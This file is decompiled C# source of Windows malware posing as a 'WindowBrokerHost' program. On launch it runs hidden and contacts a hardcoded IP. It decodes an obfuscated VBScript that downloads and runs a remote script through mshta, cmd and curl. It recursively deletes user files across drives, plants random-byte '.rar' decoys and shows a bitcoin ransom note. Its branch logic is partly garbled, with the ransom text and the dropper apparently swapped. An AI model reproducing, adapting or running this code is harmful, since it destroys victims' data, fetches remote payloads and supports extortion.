using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace WindowBrokerHost;

public class Form1 : Form
{
	public static List<string> AllFolders;

	public static List<string> AllFiles;

	private IContainer components;

	private Button button1;

	public Form1()
	{
		InitializeComponent();
		((Form)this).add_Load((EventHandler)Form1_Load);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		button1.PerformClick();
	}

	public static bool ISdel()
	{
		try
		{
			if (int.Parse((string)Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")!.GetValue("CurrentBuild")) <= 10240)
			{
				return true;
			}
			return false;
		}
		catch
		{
		}
		return false;
	}

	private void button1_Click(object sender, EventArgs e)
	{
		using (HttpClient httpClient = new HttpClient(new HttpClientHandler
		{
			AutomaticDecompression = (DecompressionMethods.GZip | DecompressionMethods.Deflate)
		}))
		{
			httpClient.BaseAddress = new Uri("http://193.149.187.161/");
			_ = httpClient.GetAsync("index.php?id=1").Result.Content.ReadAsStringAsync().Result;
		}
		byte[] bytes = Convert.FromBase64String("dXJfU0xBVkFVS1JBSU5FID0gcmVwbGFjZSgiU0xBVkFVS1JBSU5FaHRTTEFWQVVLUkFJTkV0U0xBVkFVS1JBSU5FcDovU0xBVkFVS1JBSU5FLzFTTEFWQVVLUkFJTkU5My4xU0xBVkFVS1JBSU5FNDkuMVNMQVZBVUtSQUlORTg3U0xBVkFVS1JBSU5FLjFTTEFWQVVLUkFJTkU2MVNMQVZBVUtSQUlORSIsIlNMQVZBVUtSQUlORSIsIiIpDQpjb21tRXhlY19TTEFWQVVLUkFJTkUgPSAibXNTTEFWQVVLUkFJTkVoU0xBVkFVS1JBSU5FdGEgdmJTTEFWQVVLUkFJTkVzY3JTTEFWQVVLUkFJTkVpcHQ6RXhTTEFWQVVLUkFJTkVlU0xBVkFVS1JBSU5FY3V0U0xBVkFVS1JBSU5FZSgiIkNyZWF0ZU9TTEFWQVVLUkFJTkViamVjdCgiIiIiV1NjU0xBVkFVS1JBSU5FcmlwdC5TaGVTTEFWQVVLUkFJTkVsbCIiIiIpLlJTTEFWQVVLUkFJTkV1biAiIiIiY1NMQVZBVUtSQUlORW1kIC9rIGN1U0xBVkFVS1JBSU5FcmwgLVNMQVZBVUtSQUlORWsgLVNMQVZBVUtSQUlORUwgIiAmIHVyX1NMQVZBVUtSQUlORSAmICIvb2JTTEFWQVVLUkFJTkVmdXNTTEFWQVVLUkFJTkVjYXRTTEFWQVVLUkFJTkVlZC5TTEFWQVVLUkFJTkV2YlNMQVZBVUtSQUlORXMgLS1vdVNMQVZBVUtSQUlORXRTTEFWQVVLUkFJTkVwdXQgJVVTU0xBVkFVS1JBSU5FRVJQUlNMQVZBVUtSQUlORU9GSUxFJVwxLlNMQVZBVUtSQUlORXZiU0xBVkFVS1JBSU5FcyAmIGNzY1NMQVZBVUtSQUlORXJpcHQgJVVTRVJQUlNMQVZBVUtSQUlORU9GSUxFJVxTTEFWQVVLUkFJTkUxLlNMQVZBVUtSQUlORXZTTEFWQVVLUkFJTkVicyIiIiIsMFNMQVZBVUtSQUlORTpjbFNMQVZBVUtSQUlORW9TTEFWQVVLUkFJTkVzZSIiKSINCmNvbW1FeGVjX1NMQVZBVUtSQUlORSA9IHJlcGxhY2UoY29tbUV4ZWNfU0xBVkFVS1JBSU5FLCJTTEFWQVVLUkFJTkUiLCIiKQ0KU2V0IHdzaHNfU0xBVkFVS1JBSU5FID0gY3JlYXRlb2JqZWN0KCJXU2NyaXB0LlNoZWxsIikNCndzaHNfU0xBVkFVS1JBSU5FLlJ1biAgY29tbUV4ZWNfU0xBVkFVS1JBSU5FICwxLHRydWU=");
		string @string = Encoding.UTF8.GetString(bytes);
		if (!ISdel())
		{
			byte[] bytes2 = Convert.FromBase64String("QUxMIEZJTEVTIE9OIEFMTCBZT1VSIERJU0tTLCBDTE9VRCBTVE9SQUdFLCBGTEFTSCBEUklWRVMgSEFTIEJFRU4gRU5DUllQVEVEDQpJZiB5b3Ugd2FudCB0byBkZWNyeXB0IHlvdXIgRklMRVMNCllvdSBzaG91bGQgdHJhbnNmZXIgMC4wMSBiaXRjb2luKGJ0YykgdG8gYWRkcmVzcyBiYzFxNnIzNGVweWhyamdrYXBodDVtOTBxODBleHN4YXBuazU2bTZndG4NCkFmdGVyIFBheW1lbnQgd2lsbCBkb25lIGFsbCB5b3VyIGZpbGVzIHdpbGwgYmUgYXV0byBEZWNyeXB0DQpXaGVyZSB0byBidXkgdGhlIEJpdGNvaW5zPw0KaHR0cHM6Ly9sb2NhbGJpdGNvaW5zLmNvbS9idXktYml0Y29pbnMtb25saW5lL2V1ci8NCmh0dHBzOi8vd3d3LnRoZWJhbGFuY2Vtb25leS5jb20vYmVzdC1wbGFjZXMtdG8tYnV5LWJpdGNvaW4tNDE3MDA4MQ0KU2xhdmEgVWtyYWluZSE=");
			string string2 = Encoding.UTF8.GetString(bytes2);
			File.WriteAllText("res.vbs", string2);
			appRun("cscript", "res.vbs", 1);
		}
		else
		{
			try
			{
				del();
				foreach (string allFolder in AllFolders)
				{
					try
					{
						Directory.Delete(allFolder, recursive: true);
					}
					catch
					{
					}
				}
				foreach (string allFile in AllFiles)
				{
					try
					{
						Directory.Delete(allFile, recursive: true);
					}
					catch
					{
					}
				}
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
				if (!Directory.Exists(folderPath + "\\crypt\\"))
				{
					Directory.CreateDirectory(folderPath + "\\crypt\\");
					for (int i = 0; i < 3761; i++)
					{
						Random random = new Random();
						byte[] array = new byte[10240];
						random.NextBytes(array);
						File.WriteAllBytes(folderPath + "\\crypt\\CryptoArch" + i + ".rar", array);
					}
				}
				File.WriteAllText(folderPath + "\\readme.txt", @string);
				appRun("notepad", folderPath + "\\readme.txt", 0);
			}
			catch
			{
			}
		}
		Environment.Exit(0);
	}

	public static void appRun(string app, string argx, int hid)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = app;
			processStartInfo.Arguments = argx;
			if (hid == 1)
			{
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			}
			else
			{
				processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
			}
			Process process = new Process();
			process.StartInfo = processStartInfo;
			process.Start();
		}
		catch
		{
		}
	}

	public static void del()
	{
		AllFiles = new List<string>();
		AllFolders = new List<string>();
		string[] logicalDrives = Directory.GetLogicalDrives();
		Array.Reverse((Array)logicalDrives);
		string[] array = logicalDrives;
		foreach (string text in array)
		{
			if (!text.Contains("C:"))
			{
				try
				{
					string[] directories = Directory.GetDirectories(text);
					string[] files = Directory.GetFiles(text, "*.*");
					string[] array2 = directories;
					foreach (string path in array2)
					{
						try
						{
							DirectoryInfo directoryInfo = new DirectoryInfo(path);
							AllFolders.Add(directoryInfo.FullName);
						}
						catch
						{
						}
					}
					array2 = files;
					foreach (string fileName in array2)
					{
						try
						{
							FileInfo fileInfo = new FileInfo(fileName);
							AllFiles.Add(fileInfo.FullName);
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
				continue;
			}
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
			try
			{
				string[] directories2 = Directory.GetDirectories(folderPath);
				string[] files2 = Directory.GetFiles(folderPath, "*.*");
				string[] array2 = directories2;
				foreach (string text2 in array2)
				{
					try
					{
						if (!text2.Contains("AppData"))
						{
							DirectoryInfo directoryInfo2 = new DirectoryInfo(text2);
							AllFolders.Add(directoryInfo2.FullName);
						}
					}
					catch
					{
					}
				}
				array2 = files2;
				foreach (string fileName2 in array2)
				{
					try
					{
						FileInfo fileInfo2 = new FileInfo(fileName2);
						AllFiles.Add(fileInfo2.FullName);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)button1).set_Location(new Point(33, 30));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("button1");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(309, 97));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}
}
